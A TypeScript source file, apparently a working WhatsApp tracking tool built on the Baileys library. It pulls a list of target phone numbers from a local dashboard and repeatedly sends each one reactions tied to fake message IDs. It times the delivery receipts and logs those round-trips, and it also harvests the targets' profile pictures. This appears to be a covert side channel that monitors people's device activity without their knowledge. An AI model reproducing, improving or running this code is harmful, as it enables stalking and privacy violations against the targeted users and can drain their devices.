import makeWASocket, { 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion 
} from '@whiskeysockets/baileys'
import axios from 'axios'
import P from 'pino'
import * as crypto from 'crypto' 

// --- SECURITE ANTI-CRASH ---
process.on('unhandledRejection', (err) => console.error('ERREUR SILENCIEUSE:', err));
process.on('uncaughtException', (err) => console.error('CRASH EVITE:', err));

const BASE_URL = "http://127.0.0.1:5001/api";

let activeTargets: string[] = [];
const pendingPings = new Map<string, { target: string, time: number }>();

async function sendStatusUpdate(status: string, qr?: string) {
    try { await axios.post(`${BASE_URL}/update_status`, { status, qr }); } catch (e) {}
}

async function connectToWhatsApp() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info_baileys')
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        auth: state,
        logger: P({ level: 'silent' }) as any,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 10000,
        markOnlineOnConnect: false
    })

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update
        
        if (qr) {
            console.log("\n>>> QR CODE GÉNÉRÉ : REGARDEZ LE DASHBOARD (http://localhost:5001)");
            sendStatusUpdate("SCAN_NEEDED", qr);
        }

        if (connection === 'close') {
            sendStatusUpdate("DISCONNECTED");
            const shouldReconnect = (lastDisconnect?.error as any)?.output?.statusCode !== DisconnectReason.loggedOut
            if (shouldReconnect) connectToWhatsApp()
        } else if (connection === 'open') {
            console.log('>>> CONNECTÉ ! (Version Stable)');
            sendStatusUpdate("CONNECTED");
            startConfigLoop(sock);
            startPingingLoop(sock);
        }
    })

    sock.ev.on('creds.update', saveCreds)

    sock.ev.on('messages.update', async (updates) => {
        for (const update of updates) {
            if (update.key.id && pendingPings.has(update.key.id)) {
                const status = update.update.status;
                if (status === 3 || status === 4) {
                    const pingInfo = pendingPings.get(update.key.id);
                    if (pingInfo) {
                        const rtt = Date.now() - pingInfo.time;
                        pendingPings.delete(update.key.id);
                        try {
                            await axios.post(`${BASE_URL}/log_ping`, { target: pingInfo.target, rtt: rtt });
                            console.log(`✅ RECU [${pingInfo.target.split('@')[0]}] : ${rtt}ms`); 
                        } catch (e) {}
                    }
                }
            }
        }
    })
}

async function fetchProfilePic(sock: any, jid: string) {
    try {
        const ppUrl = await sock.profilePictureUrl(jid, 'image');
        if (ppUrl) await axios.post(`${BASE_URL}/update_avatar`, { target: jid, url: ppUrl });
    } catch (e) { await axios.post(`${BASE_URL}/update_avatar`, { target: jid, url: null }); }
}

async function startConfigLoop(sock: any) {
    setInterval(async () => {
        try {
            const res = await axios.get(`${BASE_URL}/targets`);
            const newTargets = res.data;
            if (JSON.stringify(newTargets) !== JSON.stringify(activeTargets)) {
                console.log(`>>> CIBLES : ${newTargets.length}`);
                activeTargets = newTargets;
                newTargets.forEach((t: string) => fetchProfilePic(sock, t));
            }
        } catch (e) { }
    }, 5000);
}

async function startPingingLoop(sock: any) {
    while (true) {
        if (activeTargets.length === 0) {
            await new Promise(r => setTimeout(r, 2000));
            continue;
        }

        for (const target of activeTargets) {
            try {
                const start = Date.now();
                const fakeMessageId = "3EB0" + crypto.randomBytes(8).toString('hex').toUpperCase();

                const sentMsg = await sock.sendMessage(target, { 
                    react: { text: "🎲", key: { remoteJid: target, fromMe: true, id: fakeMessageId } }
                });

                if(sentMsg && sentMsg.key.id) {
                    pendingPings.set(sentMsg.key.id, { target: target, time: start });
                }
                
                await new Promise(r => setTimeout(r, 400));

            } catch (error) {
                // Erreur silencieuse pour ne pas polluer
            }
        }
        await new Promise(r => setTimeout(r, 1000));
    }
}

connectToWhatsApp();